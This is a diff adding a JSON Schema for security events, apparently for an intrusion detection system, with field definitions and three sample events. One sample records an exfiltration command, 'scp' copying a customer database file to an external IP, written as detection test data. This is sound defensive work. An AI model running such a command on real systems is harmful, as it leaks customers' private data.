@@ -1,0 +1,286 @@
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "$id": "https://sentinel-platform.example.com/schemas/event.json",
+  "title": "SecurityEvent",
+  "description": "A security event to be analyzed by the Sentinel intrusion detection system",
+  "type": "object",
+  "required": ["timestamp", "source", "actor", "action"],
+  "properties": {
+    "timestamp": {
+      "type": "string",
+      "format": "date-time",
+      "description": "Event timestamp in ISO 8601 format",
+      "examples": ["2024-01-15T14:32:18.123Z"]
+    },
+    "source": {
+      "$ref": "#/$defs/SourceInfo"
+    },
+    "actor": {
+      "$ref": "#/$defs/ActorInfo"
+    },
+    "action": {
+      "$ref": "#/$defs/ActionInfo"
+    },
+    "context": {
+      "$ref": "#/$defs/ContextInfo"
+    },
+    "raw": {
+      "type": "string",
+      "maxLength": 10000,
+      "description": "Raw log line (optional)"
+    }
+  },
+  "$defs": {
+    "SourceInfo": {
+      "type": "object",
+      "title": "SourceInfo",
+      "description": "Information about the log source",
+      "required": ["type", "hostname", "ip"],
+      "properties": {
+        "type": {
+          "type": "string",
+          "enum": ["auth", "system", "network", "app", "application"],
+          "description": "Log type: auth, system, network, or app"
+        },
+        "hostname": {
+          "type": "string",
+          "minLength": 1,
+          "maxLength": 255,
+          "description": "Hostname of the source system"
+        },
+        "ip": {
+          "type": "string",
+          "format": "ipv4",
+          "description": "IP address of the source system"
+        },
+        "service": {
+          "type": "string",
+          "description": "Service name (e.g., sshd, nginx)"
+        }
+      }
+    },
+    "GeoInfo": {
+      "type": "object",
+      "title": "GeoInfo",
+      "description": "Geographic information about the source",
+      "properties": {
+        "country": {
+          "type": "string",
+          "description": "Country code (ISO 3166-1 alpha-2)",
+          "examples": ["US", "DE", "JP"]
+        },
+        "city": {
+          "type": "string",
+          "description": "City name"
+        },
+        "lat": {
+          "type": "number",
+          "minimum": -90,
+          "maximum": 90,
+          "description": "Latitude"
+        },
+        "lon": {
+          "type": "number",
+          "minimum": -180,
+          "maximum": 180,
+          "description": "Longitude"
+        }
+      }
+    },
+    "ActorInfo": {
+      "type": "object",
+      "title": "ActorInfo",
+      "description": "Information about the actor performing the action",
+      "required": ["user", "source_ip"],
+      "properties": {
+        "user": {
+          "type": "string",
+          "minLength": 1,
+          "maxLength": 128,
+          "description": "Username of the actor"
+        },
+        "uid": {
+          "type": "integer",
+          "minimum": 0,
+          "description": "User ID (Unix UID)"
+        },
+        "session_id": {
+          "type": "string",
+          "description": "Session identifier"
+        },
+        "source_ip": {
+          "type": "string",
+          "format": "ipv4",
+          "description": "Client IP address"
+        },
+        "geo": {
+          "$ref": "#/$defs/GeoInfo"
+        }
+      }
+    },
+    "ActionInfo": {
+      "type": "object",
+      "title": "ActionInfo",
+      "description": "Information about the action performed",
+      "required": ["type", "result"],
+      "properties": {
+        "type": {
+          "type": "string",
+          "description": "Action type (e.g., authentication, authorization, file_access)",
+          "examples": [
+            "authentication",
+            "authorization",
+            "file_access",
+            "network_connection",
+            "process_execution",
+            "configuration_change",
+            "data_transfer"
+          ]
+        },
+        "subtype": {
+          "type": "string",
+          "description": "Action subtype (e.g., login_failed, sudo)",
+          "examples": ["login", "login_failed", "logout", "sudo", "read", "write"]
+        },
+        "target": {
+          "type": "string",
+          "description": "Target resource (e.g., file path, hostname, user)"
+        },
+        "method": {
+          "type": "string",
+          "description": "Method used (e.g., password, key, token)"
+        },
+        "result": {
+          "type": "string",
+          "enum": ["success", "failure", "unknown"],
+          "description": "Result of the action"
+        },
+        "reason": {
+          "type": "string",
+          "description": "Reason for failure (if result is failure)"
+        },
+        "bytes_transferred": {
+          "type": "integer",
+          "minimum": 0,
+          "description": "Number of bytes transferred (for data_transfer actions)"
+        },
+        "destination_ip": {
+          "type": "string",
+          "format": "ipv4",
+          "description": "Destination IP (for network/transfer actions)"
+        }
+      }
+    },
+    "ContextInfo": {
+      "type": "object",
+      "title": "ContextInfo",
+      "description": "Additional context about the event",
+      "properties": {
+        "process": {
+          "type": "string",
+          "description": "Process name"
+        },
+        "pid": {
+          "type": "integer",
+          "minimum": 0,
+          "description": "Process ID"
+        },
+        "parent_pid": {
+          "type": "integer",
+          "minimum": 0,
+          "description": "Parent process ID"
+        },
+        "command": {
+          "type": "string",
+          "description": "Command line executed"
+        },
+        "tty": {
+          "type": "string",
+          "description": "TTY device (e.g., pts/0)"
+        }
+      }
+    }
+  },
+  "examples": [
+    {
+      "timestamp": "2024-01-15T14:32:18.123Z",
+      "source": {
+        "type": "auth",
+        "hostname": "web-server-01",
+        "ip": "10.0.1.45",
+        "service": "sshd"
+      },
+      "actor": {
+        "user": "admin",
+        "uid": 1000,
+        "source_ip": "203.0.113.45",
+        "geo": {
+          "country": "US",
+          "city": "San Francisco",
+          "lat": 37.7749,
+          "lon": -122.4194
+        }
+      },
+      "action": {
+        "type": "authentication",
+        "subtype": "login_failed",
+        "result": "failure",
+        "reason": "invalid_password"
+      }
+    },
+    {
+      "timestamp": "2024-01-15T15:45:00.000Z",
+      "source": {
+        "type": "system",
+        "hostname": "db-server-01",
+        "ip": "10.0.2.10",
+        "service": "auditd"
+      },
+      "actor": {
+        "user": "developer",
+        "uid": 1001,
+        "source_ip": "10.0.1.50"
+      },
+      "action": {
+        "type": "authorization",
+        "subtype": "sudo",
+        "target": "root",
+        "result": "failure",
+        "reason": "not in sudoers"
+      },
+      "context": {
+        "process": "bash",
+        "pid": 12345,
+        "command": "sudo su -",
+        "tty": "pts/0"
+      }
+    },
+    {
+      "timestamp": "2024-01-15T03:22:45.789Z",
+      "source": {
+        "type": "network",
+        "hostname": "api-server-01",
+        "ip": "10.0.1.20",
+        "service": "nginx"
+      },
+      "actor": {
+        "user": "svc_backup",
+        "source_ip": "10.0.1.100"
+      },
+      "action": {
+        "type": "data_transfer",
+        "subtype": "upload",
+        "target": "/data/customers.sql",
+        "method": "scp",
+        "result": "success",
+        "bytes_transferred": 524288000,
+        "destination_ip": "45.33.32.100"
+      },
+      "context": {
+        "process": "scp",
+        "pid": 54321,
+        "command": "scp /data/customers.sql 45.33.32.100:/tmp/"
+      }
+    }
+  ]
+}
